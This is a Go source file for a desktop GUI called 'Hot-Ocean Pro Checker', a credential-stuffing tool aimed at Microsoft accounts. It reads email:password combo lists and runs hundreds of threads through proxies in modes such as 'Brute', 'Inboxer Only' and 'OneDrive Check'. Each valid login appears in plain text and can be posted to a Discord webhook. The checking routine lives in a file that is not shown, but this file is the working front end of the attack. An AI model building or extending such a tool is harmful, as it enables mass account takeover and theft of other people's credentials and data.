package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"image/color"
	"io"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/canvas"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/storage"
	"fyne.io/fyne/v2/theme"
	"fyne.io/fyne/v2/widget"
)

type Config struct {
	Mode         int
	Threads      int
	Proxy        string
	ComboFileURI fyne.URI
	Keywords     []string
	DiscordWebhook string
}

func sendDiscordWebhook(url, msg string) {
	if url == "" {
		return
	}
	payload := map[string]string{"content": msg}
	b, _ := json.Marshal(payload)
	http.Post(url, "application/json", bytes.NewBuffer(b))
}

func main() {
	a := app.NewWithID("com.ocean.checker")
	a.Settings().SetTheme(theme.DarkTheme())
	w := a.NewWindow("🔥 Hot-Ocean Pro Checker")

	// ─── UI ELEMENTS ───
	title := canvas.NewText("HOT-OCEAN PRO", color.RGBA{R: 255, G: 80, B: 80, A: 255})
	title.TextSize = 24
	title.TextStyle = fyne.TextStyle{Bold: true}
	title.Alignment = fyne.TextAlignCenter

	subtitle := canvas.NewText("Ultra-Fast Microsoft Checker", color.RGBA{R: 180, G: 180, B: 180, A: 255})
	subtitle.TextSize = 12
	subtitle.Alignment = fyne.TextAlignCenter

	modeSelect := widget.NewSelect([]string{"MS Subscription", "Inboxer Only", "Brute", "Country Target", "OneDrive Check", "All-In-One"}, nil)
	modeSelect.SetSelectedIndex(0)

	threadEntry := widget.NewEntry()
	threadEntry.SetText("200")

	proxyEntry := widget.NewEntry()
	proxyEntry.SetPlaceHolder("http://ip:port or empty for none")

	webhookEntry := widget.NewEntry()
	webhookEntry.SetPlaceHolder("Discord Webhook URL (Optional)")

	comboLabel := widget.NewLabel("📁 No Combo Selected")
	comboLabel.TextStyle = fyne.TextStyle{Bold: true}
	var comboURI fyne.URI

	// Zero-lag Log System
	var logs []string
	var logMu sync.Mutex
	logList := widget.NewList(
		func() int {
			logMu.Lock()
			defer logMu.Unlock()
			return len(logs)
		},
		func() fyne.CanvasObject {
			return widget.NewLabel("Template Label Line...")
		},
		func(i widget.ListItemID, o fyne.CanvasObject) {
			logMu.Lock()
			defer logMu.Unlock()
			if i >= 0 && i < len(logs) {
				o.(*widget.Label).SetText(logs[len(logs)-1-i]) // Show newest first
			}
		},
	)

	logMsg := func(msg string) {
		logMu.Lock()
		logs = append(logs, msg)
		if len(logs) > 1000 {
			logs = logs[len(logs)-1000:] // Keep last 1000
		}
		logMu.Unlock()
	}

	// Periodic UI Updater (Prevents Stuttering)
	go func() {
		for {
			time.Sleep(500 * time.Millisecond)
			logList.Refresh()
		}
	}()

	// Stats Elements
	lblChecked := canvas.NewText("Checked: 0/0", color.RGBA{150, 150, 150, 255})
	lblHits := canvas.NewText("Hits: 0", color.RGBA{80, 255, 80, 255})
	lbl2FA := canvas.NewText("2FA: 0", color.RGBA{255, 200, 80, 255})
	lblBads := canvas.NewText("Bad: 0", color.RGBA{255, 80, 80, 255})
	lblHits.TextStyle = fyne.TextStyle{Bold: true}

	selectBtn := widget.NewButtonWithIcon("Select Combo", theme.FolderOpenIcon(), func() {
		fd := dialog.NewFileOpen(func(reader fyne.URIReadCloser, err error) {
			if err != nil {
				dialog.ShowError(err, w)
				return
			}
			if reader == nil {
				return
			}
			comboURI = reader.URI()
			comboLabel.SetText("📁 " + comboURI.Name())
		}, w)
		fd.Show()
	})
	selectBtn.Importance = widget.HighImportance

	var isRunning bool
	var stopChan chan struct{}

	startBtn := widget.NewButtonWithIcon("START CHECKING", theme.MediaPlayIcon(), nil)
	startBtn.Importance = widget.HighImportance

	startBtn.OnTapped = func() {
		if isRunning {
			close(stopChan)
			startBtn.SetText("START CHECKING")
			startBtn.SetIcon(theme.MediaPlayIcon())
			isRunning = false
			logMsg("[SYSTEM] Stopped by user.")
			return
		}

		if comboURI == nil {
			dialog.ShowInformation("Error", "Please select a combo file first.", w)
			return
		}

		threads, err := strconv.Atoi(threadEntry.Text)
		if err != nil || threads < 1 {
			threads = 200
		}

		isRunning = true
		startBtn.SetText("STOP CHECKING")
		startBtn.SetIcon(theme.MediaStopIcon())
		stopChan = make(chan struct{})

		logMsg(fmt.Sprintf("[SYSTEM] Starting with %d threads...", threads))

		go func() {
			reader, err := storage.Reader(comboURI)
			if err != nil {
				logMsg("[ERROR] Could not read combo file.")
				return
			}
			defer reader.Close()

			b, _ := io.ReadAll(reader)
			lines := strings.Split(string(b), "\n")
			var combos []string
			for _, line := range lines {
				line = strings.TrimSpace(line)
				if strings.Contains(line, ":") {
					combos = append(combos, line)
				}
			}

			if len(combos) == 0 {
				logMsg("[ERROR] No valid combos found.")
				return
			}

			logMsg(fmt.Sprintf("[SYSTEM] Loaded %d combos.", len(combos)))

			mode := modeSelect.SelectedIndex() + 1

			jobs := make(chan string, len(combos))
			for _, c := range combos {
				jobs <- c
			}
			close(jobs)

			var wg sync.WaitGroup
			var checked, hits, twofa, bads int
			var mu sync.Mutex

			// HTTP Client Optimization Transport
			customTransport := &http.Transport{
				MaxIdleConns:        1000,
				MaxIdleConnsPerHost: 1000,
				MaxConnsPerHost:     1000,
				IdleConnTimeout:     30 * time.Second,
			}

			for i := 0; i < threads; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					chk := NewChecker(nil, false, mode)
					chk.Proxy = proxyEntry.Text
					chk.Transport = customTransport // We will add this to checker.go
					
					for line := range jobs {
						select {
						case <-stopChan:
							return
						default:
						}

						parts := strings.SplitN(line, ":", 2)
						if len(parts) < 2 {
							continue
						}
						
						email := strings.TrimSpace(parts[0])
						pass := strings.TrimSpace(parts[1])

						r := chk.Check(email, pass)

						mu.Lock()
						checked++
						if r.Status == "HIT" {
							hits++
							msg := fmt.Sprintf("✅ HIT: %s:%s | %s", email, pass, r.Country)
							logMsg(msg)
							go sendDiscordWebhook(webhookEntry.Text, msg)
						} else if r.Status == "2FA" {
							twofa++
						} else {
							bads++
						}

						// Update stats text every 50 checks to reduce CPU load
						if checked%50 == 0 || checked == len(combos) {
							lblChecked.Text = fmt.Sprintf("Checked: %d/%d", checked, len(combos))
							lblHits.Text = fmt.Sprintf("Hits: %d", hits)
							lbl2FA.Text = fmt.Sprintf("2FA: %d", twofa)
							lblBads.Text = fmt.Sprintf("Bad: %d", bads)
							lblChecked.Refresh()
							lblHits.Refresh()
							lbl2FA.Refresh()
							lblBads.Refresh()
						}
						mu.Unlock()
					}
				}()
			}

			wg.Wait()
			
			lblChecked.Text = fmt.Sprintf("Checked: %d/%d", checked, len(combos))
			lblChecked.Refresh()
			
			logMsg("[SYSTEM] Completed.")
			isRunning = false
			startBtn.SetText("START CHECKING")
			startBtn.SetIcon(theme.MediaPlayIcon())
		}()
	}

	// ─── LAYOUT ───
	header := container.NewVBox(
		title,
		subtitle,
		canvas.NewLine(color.RGBA{50, 50, 50, 255}),
	)

	statsBox := container.NewGridWithColumns(4,
		container.NewCenter(lblChecked),
		container.NewCenter(lblHits),
		container.NewCenter(lbl2FA),
		container.NewCenter(lblBads),
	)

	controlPanel := container.NewVBox(
		container.NewBorder(nil, nil, selectBtn, nil, container.NewCenter(comboLabel)),
		widget.NewSeparator(),
		statsBox,
		widget.NewSeparator(),
		startBtn,
	)

	scannerTab := container.NewBorder(
		header,
		controlPanel,
		nil, nil,
		container.NewBorder(
			widget.NewLabelWithStyle("Live Logs (High Performance):", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
			nil, nil, nil,
			logList,
		),
	)

	settingsTab := container.NewScroll(container.NewVBox(
		widget.NewLabelWithStyle("Engine Settings", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}),
		widget.NewSeparator(),
		widget.NewLabel("Run Mode:"), modeSelect,
		widget.NewLabel("Threads (CPM) - Higher = Faster:"), threadEntry,
		widget.NewSeparator(),
		widget.NewLabelWithStyle("Network & Integrations", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}),
		widget.NewSeparator(),
		widget.NewLabel("Proxy (http://ip:port):"), proxyEntry,
		widget.NewLabel("Discord Webhook URL:"), webhookEntry,
	))

	tabs := container.NewAppTabs(
		container.NewTabItemWithIcon("Scanner", theme.SearchIcon(), scannerTab),
		container.NewTabItemWithIcon("Settings", theme.SettingsIcon(), settingsTab),
	)

	w.SetContent(tabs)
	w.Resize(fyne.NewSize(450, 750))
	w.ShowAndRun()
}
